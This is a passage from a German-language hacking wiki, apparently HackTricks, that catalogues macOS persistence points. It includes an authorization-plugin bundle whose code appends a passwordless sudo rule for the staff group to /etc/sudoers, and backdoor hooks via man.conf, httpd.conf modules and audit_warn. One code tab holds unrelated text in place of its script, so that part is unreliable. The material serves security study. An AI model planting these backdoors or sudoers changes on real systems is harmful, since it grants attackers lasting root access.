Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen Root sein und zusätzliche Konfigurationen vornehmen
* TCC-Umgehung: ???

#### Standort

* `/Library/Security/SecurityAgentPlugins/`
* Root-Berechtigung erforderlich
* Es ist auch erforderlich, die Autorisierungsdatenbank zu konfigurieren, um das Plugin zu verwenden

#### Beschreibung & Ausnutzung

Sie können ein Autorisierungs-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um die Persistenz aufrechtzuerhalten. Für weitere Informationen darüber, wie man eines dieser Plugins erstellt, lesen Sie die vorherigen Writeups (und seien Sie vorsichtig, ein schlecht geschriebenes Plugin kann Sie aussperren und Sie müssen Ihren Mac im Wiederherstellungsmodus reinigen).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschieben** Sie das Bundle an den Ort, an dem es geladen werden soll:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Fügen Sie schließlich die **Regel** hinzu, um dieses Plugin zu laden:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Der **`evaluate-mechanisms`** wird dem Autorisierungsframework mitteilen, dass es eine **externe Mechanismus für die Autorisierung aufrufen muss**. Darüber hinaus wird **`privileged`** bewirken, dass es von root ausgeführt wird.

Löse es aus mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **Gruppe staff sudo-Zugriff** haben (lesen Sie `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein und der Benutzer muss man verwenden
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`/private/etc/man.conf`**
* Root erforderlich
* **`/private/etc/man.conf`**: Immer wenn man verwendet wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt an, welches Binär-/Skript verwendet wird, wenn man Dokumentationsdateien öffnet. Der Pfad zur ausführbaren Datei könnte so geändert werden, dass jedes Mal, wenn der Benutzer man verwendet, um einige Dokumente zu lesen, eine Hintertür ausgeführt wird.

Zum Beispiel in **`/private/etc/man.conf`** festlegen:
```
MANPAGER /tmp/view
```
Und erstellen Sie dann `/tmp/view` als:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein und Apache muss laufen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
* Httpd hat keine Berechtigungen

#### Standort

* **`/etc/apache2/httpd.conf`**
* Root erforderlich
* Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Sie können in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen wird, indem Sie eine Zeile hinzufügen wie: 

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Auf diese Weise werden Ihre kompilierten Module von Apache geladen. Das Einzige ist, dass Sie es entweder mit einem gültigen Apple-Zertifikat signieren müssen oder Sie ein neues vertrauenswürdiges Zertifikat im System hinzufügen und es damit signieren müssen.

Dann, falls erforderlich, um sicherzustellen, dass der Server gestartet wird, könnten Sie ausführen:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Codebeispiel für den Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM Audit Framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein, auditd muss laufen und eine Warnung verursachen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

* **`/etc/security/audit_warn`**
* Root erforderlich
* **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Sie könnten also Ihr Payload darauf hinzufügen.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Du könntest eine Warnung erzwingen mit `sudo audit -n`.

### Startobjekte

{% hint style="danger" %}
**Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**
{% endhint %}

Das **StartupItem** ist ein Verzeichnis, das entweder innerhalb von `/Library/StartupItems/` oder `/System/Library/StartupItems/` positioniert sein sollte. Sobald dieses Verzeichnis eingerichtet ist, muss es zwei spezifische Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei**, die speziell als `StartupParameters.plist` benannt ist und verschiedene Konfigurationseinstellungen enthält.

Stellen Sie sicher, dass sowohl das rc-Skript als auch die `StartupParameters.plist`-Datei korrekt im **StartupItem**-Verzeichnis platziert sind, damit der Startvorgang sie erkennen und nutzen kann.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

### Automatisches Starten von Anwendungen

#### macOS-Autostartorte

In macOS gibt es verschiedene Möglichkeiten, wie Anwendungen automatisch gestartet werden können. Hier sind einige der gängigsten Autostartorte:

1. **Launch Agents:** Diese befinden sich im Benutzerordner unter `~/Library/LaunchAgents` und starten Anwendungen, wenn sich ein Benutzer anmeldet.

2. **Launch Daemons:** Diese befinden sich im Systemordner unter `/Library/LaunchDaemons` und starten Anwendungen beim Booten des Systems.

3. **Login Items:** Diese können in den Systemeinstellungen unter "Benutzer & Gruppen" gefunden werden und starten Anwendungen, wenn sich ein Benutzer anmeldet.

4. **Startup Items:** Diese waren in älteren macOS-Versionen verfügbar, sind jedoch in neueren Versionen nicht mehr unterstützt.

Es ist wichtig, diese Autostartorte zu überwachen und zu verwalten, um unerwünschte Anwendungen zu verhindern, die automatisch gestartet werden. Dies kann die Sicherheit und Leistung des Systems verbessern. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Ich kann dieses Komponente in meinem macOS nicht finden, für weitere Informationen siehe das Writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Von Apple eingeführt, ist **emond** ein Protokollierungsmechanismus, der unterentwickelt oder möglicherweise aufgegeben zu sein scheint, aber dennoch zugänglich bleibt. Obwohl für einen Mac-Administrator nicht besonders nützlich, könnte dieser obskure Dienst als subtile Persistenzmethode für Bedrohungsakteure dienen, die von den meisten macOS-Administratoren wahrscheinlich unbemerkt bleibt.

Für diejenigen, die von seiner Existenz wissen, ist die Identifizierung einer möglichen bösartigen Nutzung von **emond** unkompliziert. Der LaunchDaemon des Systems für diesen Dienst sucht nach Skripten, die in einem einzigen Verzeichnis ausgeführt werden sollen. Um dies zu überprüfen, kann der folgende Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Standort

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root erforderlich
* **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **nicht mehr in macOS installiert**, daher sollten Sie für weitere Informationen das Writeup überprüfen.

### ~~kext~~

{% hint style="danger" %}
Es ist so kompliziert, ein kext selbst als Root zu installieren, dass ich dies nicht als Methode betrachten werde, um aus Sandboxes auszubrechen oder für Persistenz (es sei denn, Sie haben einen Exploit).
{% endhint %}

#### Standort

Um ein KEXT als Startelement zu installieren, muss es in einem der folgenden Orte installiert werden:

* `/System/Library/Extensions`
* KEXT-Dateien, die in das Betriebssystem OS X integriert sind.
* `/Library/Extensions`
* KEXT-Dateien, die von Software von Drittanbietern installiert wurden

Sie können aktuell geladene kext-Dateien auflisten mit:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Für weitere Informationen zu [**Kernel-Erweiterungen siehe diesen Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Bericht: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Ort

* **`/usr/local/bin/amstoold`**
* Root erforderlich

#### Beschreibung & Ausnutzung

Anscheinend wurde das `plist` von `/System/Library/LaunchAgents/com.apple.amstoold.plist` dieses Binär verwendet, während es einen XPC-Dienst freilegte... das Problem war, dass das Binär nicht existierte, also konnte man etwas dort platzieren und wenn der XPC-Dienst aufgerufen wird, wird Ihr Binär aufgerufen.

Ich kann das nicht mehr in meinem macOS finden.

### ~~xsanctl~~

Bericht: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Ort

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root erforderlich
* **Auslöser**: Wenn der Dienst ausgeführt wird (selten)

#### Beschreibung & Ausnutzung

Anscheinend ist es nicht sehr üblich, dieses Skript auszuführen, und ich konnte es nicht einmal in meinem macOS finden, also wenn Sie mehr Informationen möchten, überprüfen Sie den Bericht.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Dies funktioniert nicht in modernen MacOS-Versionen**
{% endhint %}

Es ist auch möglich, hier **Befehle zu platzieren, die beim Start ausgeführt werden.** Beispiel eines regulären rc.common-Skripts:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenztechniken und -tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
